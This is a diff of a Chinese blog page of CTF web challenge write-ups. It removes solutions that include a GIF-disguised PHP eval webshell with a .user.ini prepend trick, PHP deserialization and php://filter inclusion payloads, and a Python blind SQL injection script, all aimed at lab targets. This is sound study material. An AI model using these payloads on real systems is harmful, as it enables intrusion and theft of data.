@@ -74,7 +74,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">7.3k</span>
+            <span class="post-count">6.2k</span>
         </span>
     </span>
 
@@ -83,7 +83,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">34 分钟</span>
+            <span class="post-count">29 分钟</span>
         </span>
     </span>
 </div>
@@ -421,80 +421,7 @@ $res=unserialize(@$select);
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;key&#39;])) &#123;</span><br><span class="line">    $key &#x3D; $_GET[&#39;key&#39;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key &#x3D; intval($key);</span><br><span class="line">    $str &#x3D; &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key &#x3D;&#x3D; $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这题就是弱类型比较</p>
 <p>get传参:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key&#x3D;123</span><br></pre></td></tr></table></figure>
-<h2 id="极客大挑战-2019-BuyFlag"><a class="header-anchor" href="#极客大挑战-2019-BuyFlag">¶</a>[极客大挑战 2019]BuyFlag</h2>
-<p>这题我想多了。。。</p>
-<p>没注意看回显包。。</p>
-<p>看源码发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>抓包改一下</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120151830712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>password就是intval这个函数的绕过  user改为1就是构成cuit的条件</p>
-<p>前面说需要100000000元才能买</p>
-<p>现在应该是还缺乏这个条件</p>
-<p>传 money=100000000</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120152207901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>数字太长 那只能想别的办法了  我用了科学计数法 成功打出了flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120152714775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>看了师傅们的wp 观察到 php版本大于5.3  感觉是strcmp匹配漏洞。。</p>
-<p>传了个数组 <code>money[]=100000000</code>就过去了  哎我还是太菜了。。</p>
-<h2 id="SUCTF-2019-CheckIn"><a class="header-anchor" href="#SUCTF-2019-CheckIn">¶</a>[SUCTF 2019]CheckIn</h2>
-<p>文件上传的题目</p>
-<p>传一张图片 回显如下</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120153119719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现目录下有 index.php  并且查到是 nginx, 暗示很明显了</p>
-<p>利用user.ini上传</p>
-<p>先上 a.png</p>
-<p>内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;flag&#39;]);&lt;&#x2F;script&gt;  </span><br></pre></td></tr></table></figure>
-<p>再上 .user.ini</p>
-<p>内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.png</span><br></pre></td></tr></table></figure>
-<p>直接打出flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120154845590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>具体原理我就不再赘述，可以翻一下我之前写的<a href="https://wh1tecell.top/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/">blog</a></p>
-<h2 id="BJDCTF2020-Easy-MD5"><a class="header-anchor" href="#BJDCTF2020-Easy-MD5">¶</a>[BJDCTF2020]Easy MD5</h2>
-<p>回显包发现hint  熟悉的md5 true的sql漏洞</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120155423390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>密码  <code>ffifdyop</code>  进入下一层</p>
-<p>查看源码发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>传参</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>进入下一层</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>传参 得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure>
-<h2 id="ZJCTF-2019-NiZhuanSiWei"><a class="header-anchor" href="#ZJCTF-2019-NiZhuanSiWei">¶</a>[ZJCTF 2019]NiZhuanSiWei</h2>
-<p>源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  &#x2F;&#x2F;useless.php</span><br><span class="line">        $password &#x3D; unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>本来用php://input绕过第一个条件 发现text是get型的 所以使用data</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
-<p>接下来用读取 useless.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
-<p>得到源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>最后一步构造反序列化pop链</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a &#x3D; new Flag();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>最终payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>
-<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a class="header-anchor" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World">¶</a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
-<p>看题目说是uuid  懂的都懂  肯定是为了我们写脚本快一点爆flag</p>
-<p>fuzz了一下输入框</p>
-<p>过滤了  or ||  *  union 空格</p>
-<p>from  where什么的都没过滤</p>
-<p>这题我用异或</p>
-<p>具体原理:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1^1&#x3D;0 ，0^0&#x3D;0 ，0^1&#x3D;1</span><br><span class="line">1^1^1&#x3D;1， 1^1^0&#x3D;0</span><br></pre></td></tr></table></figure>
-<p>exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;b7139aa2-efde-4532-92d7-e254c04866a0.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">words &#x3D; &quot;Hello, glzjin wants a girlfriend.&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    print(&#39;----------------------------------------------------&#39;)</span><br><span class="line">    for j in range(32,129):</span><br><span class="line">        data&#x3D;&#123;&quot;id&quot;:&quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d),0,1))&quot; %(i,j)&#125;</span><br><span class="line">        re &#x3D; requests.post(url&#x3D;url,data&#x3D;data).text</span><br><span class="line">        if words in re:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-<p>奇葩的是我第一次跑出来flag是错的。。 数了一下31位。。。果断再跑一遍</p>
-<h2 id="极客大挑战-2019-HardSQL"><a class="header-anchor" href="#极客大挑战-2019-HardSQL">¶</a>[极客大挑战 2019]HardSQL</h2>
-<p>显示登陆成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;1&#39;or(0^1)%23</span><br></pre></td></tr></table></figure>
-<p>尝试使用left+regexp 写了一个盲注脚本  不愧是我 果然跑不出来。。。。</p>
-<p>参考: <a target="_blank" rel="noopener" href="http://chaosec.top/2020/04/02/buuctf/s">http://chaosec.top/2020/04/02/buuctf/s</a></p>
- 
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key&#x3D;123</span><br></pre></td></tr></table></figure> 
       <!-- reward -->
       
     </div>
